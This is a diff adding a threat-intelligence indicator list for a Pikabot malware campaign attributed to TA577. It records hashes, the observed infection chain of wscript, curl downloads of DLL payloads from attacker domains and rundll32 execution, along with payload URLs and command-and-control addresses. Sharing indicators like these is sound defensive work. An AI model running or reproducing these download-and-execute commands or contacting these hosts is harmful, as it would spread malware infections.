@@ -1,0 +1,82 @@
+11.12.2023 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.url https://flowersaffairs.com/nece/
+.zip ab2121ab61a587c9243e34fd425c57f6b40813d3288e62b81cd838e4dcc30abe
+.dll e83f167ff6f1f0c1ef0839908e884f3e64dd0f7c1c8d893f9956f9f6ac1736b4
+
+*************************************************
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Oob.js
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl https://liokinch.com/OxGDSlD/0.6111062734851184.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl  https://liokinch.com/OxGDSlD/0.6111062734851184.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl https://graytoner.com/7U8YzwN/0.45771070324757207.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl  https://graytoner.com/7U8YzwN/0.45771070324757207.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl https://rosceman.com/awPtEe/0.327583181400535.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl  https://rosceman.com/awPtEe/0.327583181400535.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl 0.6327418220721529.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl 0.6327418220721529.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl 0.3134401573046002.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl  0.3134401573046002.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Jildlfgkks\Rgdbthdnser & curl 0.6805055661135362.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+curl  0.6805055661135362.dat --output C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX
+
+cmd.exe /c timeout 10 & rundll32 C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX,Enter
+
+timeout  10 
+
+rundll32 C:\Jildlfgkks\Rgdbthdnser\Jrhrsrhdfrhse.OOOOOCCCCCXXXXX,Enter
+
+
+*************************************************
+
+.dll distro urls
+
+https://kulasid.com/iknXn/0.6769039862828654.dat
+https://rositan.com/iuZGk/0.5901726467613055.dat
+https://feritins.com/pk6z0JV/0.38662045497742236.dat
+https://liokinch.com/OxGDSlD/0.6111062734851184.dat
+https://rosceman.com/awPtEe/0.327583181400535.dat
+https://graytoner.com/7U8YzwN/0.45771070324757207.dat
+
+*************************************************
+
+c2's
+
+109.123.227.50:13782
+31.220.96.162:2224
+66.42.80.169:5631
+65.20.98.24:13783
+154.61.75.156:2078
+155.138.203.158:1194
+65.20.82.254:5243
+109.123.227.54:13785
+154.38.184.5:9785
+
+HTTPS Checking Traffic
+
+https://109.123.227.50:13782/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://31.220.96.162:2224/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://66.42.80.169:5631/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://65.20.98.24:13783/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://154.61.75.156:2078/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://155.138.203.158:1194/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://65.20.82.254:5243/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://109.123.227.54:13785/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+https://154.38.184.5:9785/Grithbreach/RsQMVvI2icgPQDx?outrances=gweduck
+
+
+*************************************************
